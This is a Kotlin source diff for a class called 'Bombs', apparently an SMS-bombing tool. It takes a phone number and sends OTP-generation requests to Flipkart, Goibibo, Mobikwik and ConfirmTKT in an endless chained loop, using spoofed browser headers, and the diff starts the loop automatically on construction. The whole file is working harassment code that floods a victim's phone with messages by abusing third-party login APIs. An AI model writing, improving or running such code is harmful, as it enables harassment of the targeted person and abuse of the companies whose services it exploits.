@@ -5,21 +5,23 @@ import org.json.JSONObject
 import java.io.IOException
 import java.util.HashMap
 
-class Bombs(private val mPhoneNumber: String) {
+class Bombs(private val mPhoneNumber: String, private val completion: (isSuccess: Boolean, message: String) -> Unit) {
 
-    var listener: OnCallBack? = null
+    init {
+        flipkart()
+    }
 
     fun flipkart() {
         val localOkHttpClient = OkHttpClient()
         val localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "loginId=%2B91$mPhoneNumber")
         localOkHttpClient.newCall(Request.Builder().url("https://www.flipkart.com/api/5/user/otp/generate").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "21").addHeader("cookie", mPhoneNumber).addHeader("connection", "keep-alive").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                listener!!.onFailListener("Flipkart ${paramAnonymousIOException.localizedMessage}")
+                completion(false,"Flipkart ${paramAnonymousIOException.localizedMessage}")
                 goibibo()
             }
 
             override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
-                listener!!.onSuccessListener("Flipkart ${paramAnonymousResponse.message()}")
+                completion(true,"Flipkart ${paramAnonymousResponse.message()}")
                 goibibo()
             }
         })
@@ -27,16 +29,16 @@ class Bombs(private val mPhoneNumber: String) {
     }
 
     private fun goibibo() {
-        val localOkHttpClient3 = OkHttpClient()
+        val localOkHttpClient = OkHttpClient()
         val localRequestBody3 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=$mPhoneNumber")
-        localOkHttpClient3.newCall(Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(object : Callback {
+        localOkHttpClient.newCall(Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                listener!!.onFailListener("Goibibo ${paramAnonymousIOException.localizedMessage}")
+                completion(false,"Goibibo ${paramAnonymousIOException.localizedMessage}")
                 mobikwick()
             }
 
             override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
-                listener!!.onSuccessListener("Goibibo ${paramAnonymousResponse.message()}")
+                completion(true,"Goibibo ${paramAnonymousResponse.message()}")
                 mobikwick()
             }
         })
@@ -51,12 +53,12 @@ class Bombs(private val mPhoneNumber: String) {
         val localRequestBody001 = RequestBody.create(localMediaType001, localJSONObject001.toString())
         localOkHttpClient001.newCall(Request.Builder().url("https://appapi.mobikwik.com/p/account/otp/cell").post(localRequestBody001).addHeader("content-type", "application/json").addHeader("User-Agent", "").addHeader("X-App-Ver", "1").addHeader("X-MClient", "1").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                listener!!.onFailListener("Mobikwik ${paramAnonymousIOException.localizedMessage}")
+                completion(false,"Mobikwik ${paramAnonymousIOException.localizedMessage}")
                 confirmTKT()
             }
 
             override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
-                listener!!.onSuccessListener("Mobikwik ${paramAnonymousResponse.message()}")
+                completion(true,"Mobikwik ${paramAnonymousResponse.message()}")
                 confirmTKT()
             }
         })
@@ -68,20 +70,14 @@ class Bombs(private val mPhoneNumber: String) {
         val call = client.newCall(request)
         call.enqueue(object : Callback {
             override fun onFailure(call: Call?, e: IOException?) {
-                listener!!.onFailListener("ConfirmTKT ${e!!.localizedMessage}")
+                completion(false,"ConfirmTKT ${e!!.localizedMessage}")
                 flipkart()
             }
 
             override fun onResponse(call: Call?, response: Response?) {
-                listener!!.onSuccessListener("ConfirmTKT ${response!!.message()}")
+                completion(true,"ConfirmTKT ${response!!.message()}")
                 flipkart()
             }
         })
     }
-
-    interface OnCallBack {
-        fun onFailListener(err: String)
-        fun onSuccessListener(res: String)
-    }
-
 }
